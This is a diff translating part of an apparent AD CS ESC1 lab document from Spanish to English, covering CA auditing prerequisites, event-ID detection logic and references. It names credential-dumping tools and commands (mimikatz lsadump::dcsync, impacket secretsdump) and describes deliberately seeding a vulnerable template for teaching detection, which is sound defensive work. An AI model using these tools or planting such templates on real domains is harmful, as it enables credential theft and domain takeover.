+**Essential prerequisite (enabled by the DSC baseline, not the seed, so it persists across seed/remediate cycles):** CA auditing (`certutil -setreg CA\AuditFilter 127` + `auditpol` subcategory *Certification Services* + `Restart-Service certsvc`) for `4886/4887/4899/4900`, and *Audit Kerberos Authentication Service* (Success) for `4768`. Without this, **the events are not generated** and detection fails on empty. Since the DSC runs in `deploy` **before** the seed post-apply, seeding the template itself already fires `4899/4900` — a teaching point: the defender observes the vulnerability being planted.
 
-**Lógica de correlación (lección de AP04): OR, nunca un AND global.** El SAN **no viaja de forma fiable** en `4886/4887` (vive en la CA DB / `certutil -view`: `Request.RequesterName` vs. el SAN del cert emitido), así que la regla **no** se apoya en un `requester != SAN` que descartaría en silencio detecciones reales. Cada señal **dispara por sí sola**: (a) cualquier enrolamiento de la *honeytemplate* es sospechoso; (b) un `4768` PKINIT para una cuenta privilegiada; (c) un `4899/4900` fuera de una ventana de cambio aprobada. La correlación `4887 → 4768` (mismo *thumbprint*/*serial*, cuenta distinta/privilegiada, ventana corta) es un **booster de fidelidad**, no un *gate*. `4768` es alto volumen (todo TGT) → el KQL lo acota a PKINIT + *Certificate Information* para contener ruido y coste.
+**Correlation logic (lesson from AP04): OR, never a global AND.** The SAN does **not travel reliably** in `4886/4887` (it lives in the CA DB / `certutil -view`: `Request.RequesterName` vs. the issued cert's SAN), so the rule does **not** rely on a `requester != SAN` that would silently drop real detections. Each signal **fires on its own**: (a) any enrollment of the *honeytemplate* is suspicious; (b) a `4768` PKINIT for a privileged account; (c) a `4899/4900` outside an approved change window. The `4887 → 4768` correlation (same *thumbprint*/*serial*, different/privileged account, short window) is a **fidelity booster**, not a *gate*. `4768` is high volume (every TGT) → the KQL scopes it to PKINIT + *Certificate Information* to contain noise and cost.
 
-**Complemento gestionado:** **Microsoft Defender for Identity** trae detección **nativa de ESC1** (y del resto de ESCx) sobre los DC con sensor — recomendada junto a estas reglas.
+**Managed complement:** **Microsoft Defender for Identity** brings **native ESC1 detection** (and the rest of the ESCx) on sensor-equipped DCs — recommended alongside these rules.
 
-> **Coste de ingesta.** Un feed de un solo DC **filtrado a 5 EventID** queda muy por debajo de 0,1-0,3 GB/día → pocos €/mes (31 d de retención incluidos). Filtra **siempre** el xPath del DCR a esos EventID: un canal *Security* sin filtrar dispara el coste de Log Analytics. Se desactiva con `collect_security_events = false` o apuntando a un workspace externo.
+> **Ingestion cost.** A single-DC feed **filtered to 5 EventIDs** stays well below 0.1-0.3 GB/day → a few EUR/month (31 days of retention included). **Always** filter the DCR xPath to those EventIDs: an unfiltered *Security* channel blows up the Log Analytics cost. It is disabled with `collect_security_events = false` or by pointing to an external workspace.
 
 ---
 
-## 📚 Referencias
+## 📚 References
 
-- SpecterOps — Will Schroeder & Lee Christensen, *Certified Pre-Owned: Abusing Active Directory Certificate Services* (definición y taxonomía de ESC1): [posts.specterops.io/certified-pre-owned](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
-- Microsoft — [KB5014754: Certificate-based authentication changes on Windows domain controllers](https://support.microsoft.com/help/5014754) (`StrongCertificateBindingEnforcement`; Compatibility vs Full Enforcement; opt-out hasta 9-sep-2025; eventos 39-41; `szOID_NTDS_CA_SECURITY_EXT` — validado 2026-11)
+- SpecterOps — Will Schroeder & Lee Christensen, *Certified Pre-Owned: Abusing Active Directory Certificate Services* (definition and taxonomy of ESC1): [posts.specterops.io/certified-pre-owned](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
+- Microsoft — [KB5014754: Certificate-based authentication changes on Windows domain controllers](https://support.microsoft.com/help/5014754) (`StrongCertificateBindingEnforcement`; Compatibility vs Full Enforcement; opt-out until 2025-09-09; events 39-41; `szOID_NTDS_CA_SECURITY_EXT` — validated 2026-11)
 - HackTricks — [AD CS Domain Escalation (ESC1)](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation)
-- Herramientas: **Certipy** ([github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)), **GhostPack Certify** ([github.com/GhostPack/Certify](https://github.com/GhostPack/Certify)) + **Rubeus** ([github.com/GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)), **impacket** (`secretsdump`), **mimikatz** (`lsadump::dcsync`), **BloodHound** (soporte AD CS)
-- Microsoft Learn — *Configure Certification Authority auditing* (`AuditFilter`), *Audit Kerberos Authentication Service* (evento 4768), *Microsoft Defender for Identity — AD CS (ESC1) detections*
+- Tools: **Certipy** ([github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)), **GhostPack Certify** ([github.com/GhostPack/Certify](https://github.com/GhostPack/Certify)) + **Rubeus** ([github.com/GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)), **impacket** (`secretsdump`), **mimikatz** (`lsadump::dcsync`), **BloodHound** (AD CS support)
+- Microsoft Learn — *Configure Certification Authority auditing* (`AuditFilter`), *Audit Kerberos Authentication Service* (event 4768), *Microsoft Defender for Identity — AD CS (ESC1) detections*
 - MITRE ATT&CK — [T1649](https://attack.mitre.org/techniques/T1649/), [T1550](https://attack.mitre.org/techniques/T1550/), [T1003.006](https://attack.mitre.org/techniques/T1003/006/)
-- Comparar con [AP02](./AP02-managed-identity.md) — mismo patrón de VM/coste/auto-shutdown (el único otro AP que factura cómputo). La siguiente capa híbrida (AP06 — Entra Connect / Seamless SSO) queda **fuera de alcance** aquí: AP05 es AD CS on-prem puro, sin sincronización con el tenant.
+- Compare with [AP02](./AP02-managed-identity.md) — same VM/cost/auto-shutdown pattern (the only other AP that bills compute). The next hybrid layer (AP06 — Entra Connect / Seamless SSO) is **out of scope** here: AP05 is pure on-prem AD CS, with no synchronization to the tenant.
